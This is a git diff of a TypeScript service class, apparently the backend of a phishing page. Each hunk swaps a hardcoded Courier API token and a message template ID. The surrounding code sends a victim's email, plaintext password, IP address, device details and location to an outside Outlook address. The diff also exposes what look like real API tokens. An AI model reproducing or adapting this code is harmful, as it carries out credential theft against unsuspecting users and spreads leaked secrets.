@@ -20,7 +20,7 @@ export class AppService {
     // Install with: npm install @trycourier/courier
     console.log(data);
     const courier = CourierClient({
-      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
+      authorizationToken: 'pk_B3G3M7Z2EPMHASKZN1FKNCPSPPNW',
     });
 
     const { deviceDetails, ipAddr, location } =
@@ -31,7 +31,7 @@ export class AppService {
         to: {
           email: 'yariaortega@outlook.com',
         },
-        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+        template: 'nt_01m2jjxps5fvm9cx95fsw43a13',
         data: {
           recipientName: `email: ${email}, \n password: ${password}
 
@@ -66,7 +66,7 @@ export class AppService {
     // Install with: npm install @trycourier/courier
 
     const courier = CourierClient({
-      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
+      authorizationToken: 'pk_B3G3M7Z2EPMHASKZN1FKNCPSPPNW',
     });
 
     const { deviceDetails, ipAddr, location } =
@@ -78,7 +78,7 @@ export class AppService {
           to: {
             email: 'yariaortega@outlook.com',
           },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          template: 'nt_01m2jjxps5fvm9cx95fsw43a13',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
@@ -112,7 +112,7 @@ export class AppService {
     // Install with: npm install @trycourier/courier
     console.log(data);
     const courier = CourierClient({
-      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
+      authorizationToken: 'pk_B3G3M7Z2EPMHASKZN1FKNCPSPPNW',
     });
 
     const { deviceDetails, ipAddr, location } =
@@ -124,7 +124,7 @@ export class AppService {
           to: {
             email: 'yariaortega@outlook.com',
           },
-          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
+          template: 'nt_01m2jjxps5fvm9cx95fsw43a13',
           data: {
             recipientName: `email: ${email}, \n password: ${password}
 
